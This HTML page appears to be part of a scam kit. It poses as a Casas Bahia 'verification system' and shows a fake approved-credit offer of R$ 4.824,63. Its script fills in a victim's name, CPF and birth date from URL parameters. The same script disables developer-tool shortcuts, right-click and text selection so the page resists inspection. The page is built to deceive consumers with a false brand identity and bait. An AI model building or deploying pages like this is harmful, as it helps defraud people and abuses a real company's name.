<html lang="pt-BR" data-lt-installed="true">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, max-scale=1.0">
  <title>Sistema de Verificação - Casas Bahia</title>
  <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
    }

    body {
        background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 50%, #f1f5f9 100%);
        color: #1e293b;
        margin: 0;
        padding: 0;
        min-height: 100vh;
        line-height: 1.6;
        overflow-x: hidden;
        -webkit-touch-callout: none;
        -webkit-user-select: none;
        -khtml-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
    }

    .iframe-container {
        width: 100%;
        max-width: 380px;
        margin: 0 auto;
        padding: 10px;
        box-sizing: border-box;
        min-height: auto;
    }

    .container {
        width: 100%;
        background: linear-gradient(145deg, #ffffff 0%, #fafbfc 100%);
        padding: 20px;
        border-radius: 12px;
        box-shadow: 
            0 6px 24px rgba(0, 0, 0, 0.05),
            0 2px 6px rgba(0, 0, 0, 0.03),
            inset 0 1px 0 rgba(255, 255, 255, 0.7);
        border: 1px solid rgba(226, 232, 240, 0.6);
        transition: transform 0.3s ease, box-shadow 0.3s ease;
        box-sizing: border-box;
    }

    .container:hover {
        transform: translateY(-1px);
        box-shadow: 
            0 10px 32px rgba(0, 0, 0, 0.08),
            0 3px 8px rgba(0, 0, 0, 0.06);
    }

    .logo {
        display: flex;
        justify-content: center;
        width: 100%;
        margin-bottom: 15px;
    }

    .logo img {
        max-width: 100px;
        height: auto;
        display: block;
        transition: transform 0.3s ease;
    }

    .logo img:hover {
        transform: scale(1.05);
    }

    .separator {
        border: none;
        border-top: 2px solid #0d64fb;
        width: 100%;
        margin: 15px 0;
        position: relative;
        overflow: hidden;
    }

    .separator::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(13, 100, 251, 0.4), transparent);
        animation: shimmer 3s infinite;
    }

    @keyframes shimmer {
        0% { left: -100%; }
        100% { left: 100%; }
    }

    .main-card {
        font-size: 14px;
        background: linear-gradient(135deg, rgba(34, 197, 94, 0.05) 0%, rgba(16, 185, 129, 0.1) 100%);
        border: 1px solid rgba(34, 197, 94, 0.2);
        padding: 16px;
        margin-bottom: 20px;
        width: 100%;
        text-align: center;
        border-radius: 12px;
        line-height: 1.5;
        color: #166534;
        font-weight: 600;
        position: relative;
        overflow: hidden;
    }

    .main-card::before {
        content: '';
        position: absolute;
        top: 0;
        right: -50%;
        width: 100%;
        height: 100%;
        background: linear-gradient(45deg, transparent 30%, rgba(34, 197, 94, 0.1) 50%, transparent 70%);
        transform: skewX(-25deg);
        animation: cardShimmer 3s infinite;
    }

    @keyframes cardShimmer {
        0% { right: -50%; }
        50% { right: 150%; }
        100% { right: -50%; }
    }

    .info-card {
        background: linear-gradient(135deg, rgba(13, 100, 251, 0.02) 0%, rgba(59, 130, 246, 0.05) 100%);
        border: 1px solid rgba(13, 100, 251, 0.1);
        padding: 12px 16px;
        margin-bottom: 12px;
        width: 100%;
        border-radius: 10px;
        transition: all 0.3s ease;
        position: relative;
    }

    .info-card:hover {
        background: linear-gradient(135deg, rgba(13, 100, 251, 0.05) 0%, rgba(59, 130, 246, 0.1) 100%);
        border-color: rgba(13, 100, 251, 0.2);
        transform: translateX(3px);
    }

    .info-card::before {
        content: '';
        position: absolute;
        left: 0;
        top: 50%;
        transform: translateY(-50%);
        width: 3px;
        height: 0;
        background: linear-gradient(to bottom, #0d64fb, #1e40af);
        border-radius: 2px;
        transition: height 0.3s ease;
    }

    .info-card:hover::before {
        height: 60%;
    }

    .info-card-title {
        font-size: 11px;
        color: #64748b;
        margin-bottom: 4px;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }

    .info-card-value {
        font-size: 14px;
        color: #1e293b;
        font-weight: 700;
        letter-spacing: -0.025em;
    }

    .credit-card {
        background: linear-gradient(135deg, #0d64fb 0%, #1e40af 100%);
        color: white;
        padding: 16px;
        border-radius: 12px;
        margin-bottom: 12px;
        position: relative;
        overflow: hidden;
        box-shadow: 
            0 8px 32px rgba(13, 100, 251, 0.3),
            0 2px 8px rgba(0, 0, 0, 0.1),
            inset 0 1px 0 rgba(255, 255, 255, 0.2);
        border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .credit-card::before {
        content: '';
        position: absolute;
        top: 0;
        right: -50%;
        width: 100%;
        height: 100%;
        background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%);
        transform: skewX(-25deg);
        animation: creditShimmer 3s infinite;
    }

    @keyframes creditShimmer {
        0% { right: -50%; }
        50% { right: 150%; }
        100% { right: -50%; }
    }

    .credit-card .info-card-title {
        color: rgba(255, 255, 255, 0.8);
    }

    .credit-card .info-card-value {
        color: white;
        font-size: 18px;
        font-weight: 800;
        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
    }

    .footer-text {
        text-align: center;
        color: #64748b;
        font-size: 12px;
        line-height: 1.4;
        font-weight: 500;
        margin-top: 20px;
        padding-top: 15px;
        border-top: 1px solid rgba(226, 232, 240, 0.6);
    }

    .verification-badge {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        background: linear-gradient(135deg, rgba(34, 197, 94, 0.1) 0%, rgba(16, 185, 129, 0.1) 100%);
        border: 1px solid rgba(34, 197, 94, 0.2);
        color: #059669;
        padding: 8px 16px;
        border-radius: 50px;
        font-size: 12px;
        font-weight: 600;
        margin-bottom: 15px;
    }

    .verification-badge::before {
        content: '✓';
        display: inline-block;
        width: 16px;
        height: 16px;
        background: #059669;
        color: white;
        border-radius: 50%;
        text-align: center;
        line-height: 16px;
        font-size: 10px;
        font-weight: bold;
    }

    /* Responsividade para iframe mobile */
    @media (max-width: 480px) {
        .iframe-container {
            padding: 8px;
            max-width: 350px;
        }

        .container {
            padding: 15px;
        }

        .logo img {
            max-width: 80px;
        }

        .main-card {
            font-size: 13px;
            padding: 14px;
        }

        .info-card {
            padding: 10px 14px;
            margin-bottom: 10px;
        }

        .info-card-value {
            font-size: 13px;
        }

        .credit-card .info-card-value {
            font-size: 16px;
        }
    }

    /* Melhorias de performance */
    .container,
    .info-card,
    .main-card,
    .logo img {
        will-change: transform;
    }

    /* Acessibilidade */
    @media (prefers-reduced-motion: reduce) {
        *,
        *::before,
        *::after {
            animation-duration: 0.01ms !important;
            animation-iteration-count: 1 !important;
            transition-duration: 0.01ms !important;
        }
    }
  </style>
</head>
<body class="vsc-initialized">
  
  <!-- Header removido para iframe -->

  <div class="iframe-container">
    <div class="container">
      <div class="logo">
        <img src="./images/Casas_Bahia_logo.svg" alt="Logo Casas Bahia">
      </div>
      
      <hr class="separator">

      <div class="verification-badge">
        Cadastro Confirmado
      </div>

      <div class="main-card">
        Seu cadastro foi confirmado com sucesso!<br>
        Confira abaixo as informações cadastradas.
      </div>

      <!-- Informações do usuário -->
      <div class="info-card">
        <div class="info-card-title">Nome completo</div>
        <div class="info-card-value" id="fullNameValue">{{nome}}</div>
      </div>

      <div class="info-card">
        <div class="info-card-title">CPF</div>
        <div class="info-card-value" id="cpfValue">{{cpf}}</div>
      </div>

      <div class="info-card">
        <div class="info-card-title">Data de Nascimento</div>
        <div class="info-card-value" id="birthDateValue">{{nascimento}}</div>
      </div>
      
      <!-- Card especial para crédito -->
      <div class="info-card credit-card">
        <div class="info-card-title">Crédito liberado</div>
        <div class="info-card-value">R$ 4.824,63</div>
      </div>

      <hr class="separator">
    </div>
  </div>
  <script>
    // Função para formatar CPF
    function formatCPF(cpf) {
      // Remove qualquer formatação existente
      cpf = cpf.replace(/\D/g, '');
      
      // Verifica se tem 11 dígitos
      if (cpf.length !== 11) {
        return cpf; // Retorna como está se não tiver 11 dígitos
      }
      
      // Aplica a formatação padrão: 000.000.000-00
      return cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
    }

    // Função para prevenção de teclas de desenvolvedor
    function preventDevTools() {
      document.addEventListener('keydown', function(e) {
        if (e.keyCode === 123 || 
           (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
           (e.ctrlKey && e.keyCode === 85) ||
           (e.ctrlKey && (e.keyCode === 83 || e.keyCode === 85))) {
          e.preventDefault();
        }
      });

      document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
      });

      document.addEventListener('selectstart', function(e) {
        e.preventDefault();
      });
    }

    // Inicialização da página
    document.addEventListener('DOMContentLoaded', function() {
      // Previne ferramentas de desenvolvedor
      preventDevTools();

      // Pega os parâmetros da URL
      const params = new URLSearchParams(window.location.search);
      const fullNameValue = params.get('name') || params.get('nome') || 'Nome não informado';
      let cpfValue = params.get('cpf') || 'CPF não informado';
      const birthDateValue = params.get('birthDate') || params.get('nascimento') || 'Data não informada';
      
      // Formata o CPF se necessário
      if (cpfValue !== 'CPF não informado') {
        cpfValue = formatCPF(cpfValue);
      }
      
      // Atualiza os elementos na página
      document.getElementById('fullNameValue').textContent = fullNameValue;
      document.getElementById('cpfValue').textContent = cpfValue;
      document.getElementById('birthDateValue').textContent = birthDateValue;

      // Animação de entrada dos cards
      const infoCards = document.querySelectorAll('.info-card');
      infoCards.forEach((card, index) => {
        setTimeout(() => {
          card.style.opacity = '1';
          card.style.transform = 'translateY(0)';
        }, index * 100);
      });
    });
  </script>

</body>
</html>
